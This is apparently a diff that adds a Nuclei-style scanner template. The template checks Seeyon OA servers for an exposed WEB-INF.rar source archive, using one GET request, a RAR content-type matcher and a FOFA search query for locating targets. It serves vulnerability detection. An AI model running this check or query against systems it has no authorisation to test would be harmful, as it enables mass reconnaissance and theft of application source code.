@@ -1,0 +1,30 @@
+id: seeyon-web-inf-disclosure
+info:
+  name: 致远OA-WEB-INF-源码泄露
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-%E8%87%B4%E8%BF%9C-oa-WEB-INF.rar-leak.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="seeyon/index.jsp"
+    tips:
+    repair:
+    version:
+  tags: seeyon,disclosure
+
+http:
+  - raw:
+      - |
+        GET /seeyon/WEB-INF.rar HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(header,'application/x-rar-compressed')
+        condition: and
